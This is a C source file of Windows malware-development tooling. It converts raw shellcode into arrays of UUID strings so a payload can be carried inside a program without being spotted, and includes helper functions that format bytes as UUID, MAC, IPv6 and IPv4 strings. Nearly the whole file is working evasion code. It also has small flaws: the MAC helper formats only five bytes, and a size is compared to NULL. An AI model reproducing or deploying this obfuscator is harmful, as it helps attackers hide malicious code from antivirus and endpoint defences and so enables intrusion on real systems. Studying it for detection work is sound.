#include <Windows.h>
#include <stdio.h>

#include "helpers.h"

char* GenerateUUID(int b0, int b1, int b2, int b3, int b4, int b5, int b6, int b7,
					   int b8, int b9, int b10, int b11, int b12, int b13, int b14, int b15) {
	

	char* result = (char*)malloc(64);
	if (!result) return NULL;

	// Format the bytes into a UUID string b3b2b1b0-b4b5-b6b7-b8b9-b10b11b12b13b14b15
	sprintf(result, "%0.2X%0.2X%0.2X%0.2X-%0.2X%0.2X-%0.2X%0.2X-%0.2X%0.2X-%0.2X%0.2X%0.2X%0.2X%0.2X%0.2X",
		// Note the reversed order for the first 4 bytes to match the UUID format (little endian)
		b3, b2, b1, b0, 
		b5, b4, 
		b7, b6, 
		b8, b9, 
		b10, b11, b12, b13, b14, b15);

	return result;
}

// Generate a MAC address string from 5 bytes
char* GenerateMAC(int b0, int b1, int b2, int b3, int b4) {
	char* result = (char*)malloc(64);
	if (!result) return NULL;

	sprintf(result, "%0.2X:%0.2X:%0.2X:%0.2X:%0.2X", b0, b1, b2, b3, b4);

	return result;
}

// Generate an IPv6 address string from 16 bytes
char* GenerateIPv6(int b0, int b1, int b2, int b3, int b4, int b5, int b6, int b7,
	int b8, int b9, int b10, int b11, int b12, int b13, int b14, int b15) {


	char* result = (char*)malloc(128);
	if (!result) return NULL;

	// Format the bytes into a IPv6 string b0b1:b2b3:b4b5:b6b7:b8b9:b10b11:b12b13:b14b15
	sprintf(result, "%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X",
		b0, b1, b2, b3, b4, b5, b6, b7, b8, b9, b10, b11, b12, b13, b14, b15);

	return result;
}

// Generate an IPv4 address string from 4 bytes
char* GenerateIPv4(int b0, int b1, int b2, int b3) {
	char* result = (char*)malloc(64);
	if (!result) return NULL;

	// Format the bytes into an IPv4 string b0.b1.b2.b3
	sprintf(result, "%d.%d.%d.%d", b0, b1, b2, b3);
	return result;
}

// returns UUID obfuscated shell code
BOOL ObfuscateUUID(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
		return FALSE;
	}

	SIZE_T count = ShellcodeSize / 16;
	printf("char* UuidArray[%zu] = {\n\t", count);

	for (SIZE_T i = 0; i < ShellcodeSize; i += 16) {
		char* uuid = GenerateUUID(
			pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], 
			pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7], 
			pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11], 
			pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
			);

		BOOL isLast = (i == ShellcodeSize - 16);
		printf(isLast ? "\"%s\"" : "\"%s\", ", uuid);
		free(uuid);
		uuid = NULL;

		if (!isLast && ((i / 16 + 1) % 3 == 0)) {
			printf("\n\t");
		}
	}

	printf("\n};\n\n");
	printf("#define NumberOfElements %zu\n\n", count);
	return TRUE;
}